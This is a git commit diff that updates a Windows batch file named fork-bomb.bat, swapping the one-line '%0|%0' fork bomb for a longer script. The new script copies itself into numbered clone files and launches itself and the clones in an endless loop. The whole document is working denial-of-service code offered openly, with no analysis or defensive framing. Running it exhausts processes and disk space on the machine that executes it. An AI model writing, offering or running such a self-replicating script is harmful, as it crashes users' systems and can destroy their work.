59411e58b923bd5f727bc20c80e855252f60cebd
Ok2dot0 <93327029+Ok2dot0@users.noreply.github.com>
2022-03-09 16:55:19 +0100

    Update fork-bomb.bat

--- fork-bomb.bat
+++ fork-bomb.bat
@@ -1,1 +1,15 @@
-%0|%0
+@echo off
+set name=%0
+set clone=1
+:start
+:clone
+If not exist clone%clone%.bat (
+copy "%name%" "clone%clone%.bat"
+) else (
+set /a clone=%clone%+1
+GoTo clone
+)
+start %name%
+start clone%clone%.bat
+GoTo start
+pause
